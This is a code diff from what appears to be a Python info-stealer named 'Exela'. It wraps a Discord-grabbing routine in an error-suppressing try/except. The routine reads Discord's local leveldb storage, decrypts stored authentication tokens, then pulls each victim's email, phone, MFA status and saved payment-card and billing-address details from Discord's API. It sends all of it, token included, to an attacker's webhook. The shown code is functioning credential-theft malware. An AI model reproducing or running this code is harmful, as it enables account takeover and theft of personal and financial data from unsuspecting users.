@@ -512,62 +512,65 @@ class ChromeLoginData:
     def setTwitch(self):
         pass
     def setDiscord(self):
-        paths = {
-            "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
-            "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
-            "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb")
-        }
-        for name, path in paths.items():
-            if not os.path.isdir(path):
-                continue
-            discord = name.replace(" ", "").lower()
-            if "discord" in path:
-                if not os.path.isfile(os.getenv("appdata") + f"\\{discord}\\Local State"):
+        try:
+            paths = {
+                "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
+                "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
+                "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb")
+            }
+            for name, path in paths.items():
+                if not os.path.isdir(path):
                     continue
-                for file_name in os.listdir(path):
-                    if file_name[-3:] not in ["log", "ldb"]:
+                discord = name.replace(" ", "").lower()
+                if "discord" in path:
+                    if not os.path.isfile(os.getenv("appdata") + f"\\{discord}\\Local State"):
                         continue
-                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for q in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
-                            if self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")) in self.dcToken:
-                                continue
-                            else:
-                                self.dcToken.append(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
-        if self.dcToken:
-            self.discrod = True
-            for f in self.dcToken:
-                headers = {"Authorization" : f}
-                req = requests.get("https://discord.com/api/v8/users/@me", headers=headers).json()
-                req2 = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()[0]                  
-                id = req["id"]
-                dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req['avatar']}"
-                payment = req['premium_type']
-                nitro = ""
-                if requests.get(dcpp + ".png").status_code == 200:
-                    dcpp += ".png"
-                else:dcpp += ".gif"
-                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd")
-                embed.set_thumbnail(url=dcpp)
-                embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
-                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req['username']}```")
-                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req['email']}```")
-                if req["phone"] != None:
-                    embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req['phone']}```")
-                embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req['mfa_enabled']}```")
-                if payment == 0:nitro="No Nitro"
-                elif payment == 1:nitro="Nitro Classic"
-                elif payment == 2:nitro="Normal Classic"
-                elif payment == 3:nitro="Nitro Basic"
-                else:nitro="Unkown"
-                embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
-                if req2:
-                    billgininfo = f"{req2['billing_address']['line_1']}, {req2['billing_address']['city']}, " + f"{req2['billing_address']['country']}, " + f"{req2['billing_address']['postal_code']}, "
-                    embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {req2['brand']}, Last Four : {req2['last_4']}, Expiration Date : {req2['expires_month']}/{req2['expires_year']}, Cart on name : {req2['billing_address']['name']}, Adress : {billgininfo}```")
-                if req['bio'] != "":
-                    embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req['bio']}```")
-                embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
-                self.hook.send(embed=embed)
-                self.discordd.append(f"Discord ID : {id}\nUsername : {req['username']}\nEmail : {req['email']}\nis mfa Enabled : {req['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
+                    for file_name in os.listdir(path):
+                        if file_name[-3:] not in ["log", "ldb"]:
+                            continue
+                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                            for q in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
+                                if self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")) in self.dcToken:
+                                    continue
+                                else:
+                                    self.dcToken.append(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
+            if self.dcToken:
+                self.discrod = True
+                for f in self.dcToken:
+                    headers = {"Authorization" : f}
+                    req = requests.get("https://discord.com/api/v8/users/@me", headers=headers).json()
+                    req2 = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()[0]                  
+                    id = req["id"]
+                    dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req['avatar']}"
+                    payment = req['premium_type']
+                    nitro = ""
+                    if requests.get(dcpp + ".png").status_code == 200:
+                        dcpp += ".png"
+                    else:dcpp += ".gif"
+                    embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd")
+                    embed.set_thumbnail(url=dcpp)
+                    embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
+                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req['username']}```")
+                    embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req['email']}```")
+                    if req["phone"] != None:
+                        embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req['phone']}```")
+                    embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req['mfa_enabled']}```")
+                    if payment == 0:nitro="No Nitro"
+                    elif payment == 1:nitro="Nitro Classic"
+                    elif payment == 2:nitro="Normal Classic"
+                    elif payment == 3:nitro="Nitro Basic"
+                    else:nitro="Unkown"
+                    embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
+                    if req2:
+                        billgininfo = f"{req2['billing_address']['line_1']}, {req2['billing_address']['city']}, " + f"{req2['billing_address']['country']}, " + f"{req2['billing_address']['postal_code']}, "
+                        embed.add_field(name="💳 Paymen information", inline=False, value = f"```card Type : {req2['brand']}, Last Four : {req2['last_4']}, Expiration Date : {req2['expires_month']}/{req2['expires_year']}, Cart on name : {req2['billing_address']['name']}, Adress : {billgininfo}```")
+                    if req['bio'] != "":
+                        embed.add_field(name="<a:gift:1021608479808569435> Discord Account Biography",inline=False, value=f"```{req['bio']}```")
+                    embed.add_field(name=f"<a:pinkcrown:996004209667346442> Discord Token",inline=False, value=f"```{f}```")
+                    self.hook.send(embed=embed)
+                    self.discordd.append(f"Discord ID : {id}\nUsername : {req['username']}\nEmail : {req['email']}\nis mfa Enabled : {req['mfa_enabled']}\nNitro Status : {nitro}\nDiscord Token : {str(f)}")
+        except:
+            pass
         
     def sendxd(self):
         global hooksxd
